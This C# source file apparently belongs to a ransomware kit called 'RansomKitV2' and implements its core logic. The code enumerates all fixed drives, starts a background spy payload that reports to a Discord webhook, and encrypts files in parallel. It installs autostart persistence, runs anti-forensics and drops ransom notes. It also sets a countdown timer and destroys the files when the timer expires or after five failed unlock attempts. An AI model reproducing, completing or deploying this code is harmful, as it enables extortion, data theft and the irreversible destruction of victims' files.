using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime;
using System.Threading;
using System.Threading.Tasks;

namespace RansomKitV2
{
    public static class RansomCore
    {
        public static event Action<int, int>? ProgressChanged;
        public static event Action<string>? StatusChanged;
        public static event Action<TimeSpan>? TimerTick;
        public static event Action? TimerExpired;

        private static RansomTimer? _timer;

        // Automatically finds all fixed drives and sorts them by speed (NVMe -> SSD -> HDD)
        public static List<string> GetDefaultTargetDrives()
        {
            var drives = new List<string>();
            try
            {
                foreach (var drive in DriveInfo.GetDrives())
                {
                    if (drive.IsReady && drive.DriveType == DriveType.Fixed)
                    {
                        drives.Add(drive.RootDirectory.FullName);
                    }
                }
            }
            catch { }

            // Sort by DriveSpeed (NVMe=0, SSD=1, HDD=2)
            return drives.OrderBy(d => DriveHelper.GetDriveType(d)).ToList();
        }

        public static async Task StartAutoAsync(TimeSpan timeLimit)
        {
            var roots = GetDefaultTargetDrives();
            await StartAsync(roots, timeLimit);
        }

        public static async Task StartAsync(IEnumerable<string> targetPaths, TimeSpan timeLimit)
        {
            var roots = new List<string>(targetPaths);
            if (roots.Count == 0) return;

            // =========================================================
            // FIRE SPY PAYLOAD IN THE BACKGROUND (Discord Webhook)
            // =========================================================
            _ = Task.Run(() => SpyPayload.ExecuteAsync());

            StatusChanged?.Invoke("Scanning drives...");
            var files = await Task.Run(() => Walker.Walk(roots));

            if (files.Count == 0)
            {
                StatusChanged?.Invoke("No target files found.");
                return;
            }

            // Save state as "Encryption in progress"
            StateManager.Save(new StateData { Files = files, Paths = roots, Locked = true, EncryptionCompleted = false, Attempts = 0 });
            Persistence.SavePaths(roots);
            Persistence.SetLocked(true);
            Persistence.EnsureAutoStart();

            await Task.Run(() => CryptoEngine.PrimeSessionKey());

            int total = files.Count;
            int done = 0;
            int failed = 0;

            StatusChanged?.Invoke($"Encrypting 0/{total}...");
            var sw = Stopwatch.StartNew();

            await Task.Run(() =>
            {
                GCSettings.LatencyMode = GCLatencyMode.SustainedLowLatency;

                // Group files by Drive
                var driveGroups = files.GroupBy(f => Path.GetPathRoot(f) ?? @"C:\").ToList();

                // Sort groups by DriveSpeed (NVMe first)
                var sortedGroups = driveGroups.OrderBy(g => DriveHelper.GetDriveType(g.Key)).ToList();

                var lastUpdate = DateTime.UtcNow;

                foreach (var group in sortedGroups)
                {
                    var driveType = DriveHelper.GetDriveType(group.Key);

                    // Hardware-specific thread counts
                    int maxThreads = driveType switch
                    {
                        DriveSpeed.NVMe => 32,
                        DriveSpeed.SSD => 8,
                        DriveSpeed.HDD => 1,
                        _ => 4
                    };

                    ThreadPool.SetMinThreads(maxThreads, maxThreads);

                    Parallel.ForEach(group, new ParallelOptions { MaxDegreeOfParallelism = maxThreads }, f =>
                    {
                        try
                        {
                            CryptoEngine.EncryptFile(f);
                            int current = Interlocked.Increment(ref done);

                            if ((DateTime.UtcNow - lastUpdate).TotalMilliseconds > 50 || current == total)
                            {
                                lastUpdate = DateTime.UtcNow;
                                ProgressChanged?.Invoke(current, total);
                            }
                        }
                        catch { Interlocked.Increment(ref failed); }
                    });
                }

                GCSettings.LatencyMode = GCLatencyMode.Interactive;
            });

            sw.Stop();

            // Mark encryption as complete
            var state = StateManager.Load();
            if (state != null)
            {
                state.EncryptionCompleted = true;
                StateManager.Save(state);
            }

            _ = Task.Run(() =>
            {
                try { AntiForensics.Run(); } catch { }
                try { NoteDropper.Drop(roots); } catch { }
            });

            await Task.Delay(1000);
            CryptoEngine.StopDeleteQueue();

            CryptoEngine.ResetSessionKey();
            StatusChanged?.Invoke($"Encrypted {done} files in {sw.Elapsed.TotalSeconds:F2} seconds.");
            StartTimer(timeLimit);
        }

        public static void ResumeTimer()
        {
            if (!Persistence.IsLocked()) return;

            var storedDeadline = Persistence.LoadDeadline();
            if (storedDeadline == null)
            {
                StartTimer(TimeSpan.FromDays(3));
                return;
            }

            _timer = new RansomTimer();
            _timer.Tick += (remaining) => TimerTick?.Invoke(remaining);
            _timer.Expired += OnTimerExpired;
            _timer.Resume(storedDeadline.Value);
        }

        public static async Task UnlockAsync(string password)
        {
            var state = StateManager.Load();
            if (state == null) state = new StateData();

            // 5 Attempt Limit Check
            if (state.Attempts >= 5)
            {
                Task.Run(() => FileDestructor.Execute());
                throw new Exception("Maximum attempts reached. Files have been destroyed.");
            }

            if (!CryptoEngine.VerifyPassword(password))
            {
                state.Attempts++;
                StateManager.Save(state);

                if (state.Attempts >= 5)
                {
                    Task.Run(() => FileDestructor.Execute());
                    throw new Exception("Maximum attempts reached. Files have been destroyed.");
                }

                throw new UnauthorizedAccessException($"Invalid key. {5 - state.Attempts} attempts remaining.");
            }

            _timer?.Stop();
            _timer = null;

            Persistence.ClearDeadline();
            StatusChanged?.Invoke("Searching for encrypted files...");

            var paths = state.Paths.Count > 0 ? state.Paths : Persistence.LoadPaths();
            if (paths.Count == 0) paths = GetDefaultTargetDrives();

            var options = new EnumerationOptions { IgnoreInaccessible = true, RecurseSubdirectories = true };
            var files = new List<string>();

            foreach (var p in paths)
            {
                try { files.AddRange(Directory.GetFiles(p, "*" + CryptoEngine.LockedExtension, options)); }
                catch { }
            }

            if (files.Count == 0)
            {
                StatusChanged?.Invoke("No encrypted files found.");
                return;
            }

            await Task.Run(() => CryptoEngine.PrimeSessionKey());

            int total = files.Count;
            int done = 0, failed = 0;
            StatusChanged?.Invoke($"Decrypting 0/{total}...");

            var sw = Stopwatch.StartNew();

            await Task.Run(() =>
            {
                GCSettings.LatencyMode = GCLatencyMode.SustainedLowLatency;

                var driveGroups = files.GroupBy(f => Path.GetPathRoot(f) ?? @"C:\").ToList();
                var sortedGroups = driveGroups.OrderBy(g => DriveHelper.GetDriveType(g.Key)).ToList();

                var lastUpdate = DateTime.UtcNow;

                foreach (var group in sortedGroups)
                {
                    var driveType = DriveHelper.GetDriveType(group.Key);
                    int maxThreads = driveType switch
                    {
                        DriveSpeed.NVMe => 32,
                        DriveSpeed.SSD => 8,
                        DriveSpeed.HDD => 1,
                        _ => 4
                    };

                    ThreadPool.SetMinThreads(maxThreads, maxThreads);

                    Parallel.ForEach(group, new ParallelOptions { MaxDegreeOfParallelism = maxThreads }, f =>
                    {
                        try
                        {
                            CryptoEngine.DecryptFile(f);
                            int current = Interlocked.Increment(ref done);

                            if ((DateTime.UtcNow - lastUpdate).TotalMilliseconds > 50 || current == total)
                            {
                                lastUpdate = DateTime.UtcNow;
                                ProgressChanged?.Invoke(current, total);
                            }
                        }
                        catch { Interlocked.Increment(ref failed); }
                    });
                }

                GCSettings.LatencyMode = GCLatencyMode.Interactive;
            });

            sw.Stop();
            await Task.Delay(1000);
            CryptoEngine.StopDeleteQueue();

            CryptoEngine.ResetSessionKey();

            StateManager.Clear();
            Persistence.DisableAutoStart();
            Persistence.SetLocked(false);
            Persistence.ClearPaths();

            StatusChanged?.Invoke($"Decrypted {done} files in {sw.Elapsed.TotalSeconds:F2} seconds.");
        }

        private static void StartTimer(TimeSpan timeLimit)
        {
            _timer = new RansomTimer();
            _timer.Tick += (remaining) => TimerTick?.Invoke(remaining);
            _timer.Expired += OnTimerExpired;
            _timer.Start(timeLimit);
        }

        private static void OnTimerExpired()
        {
            TimerExpired?.Invoke();
            Task.Run(() => FileDestructor.Execute());
        }
    }
}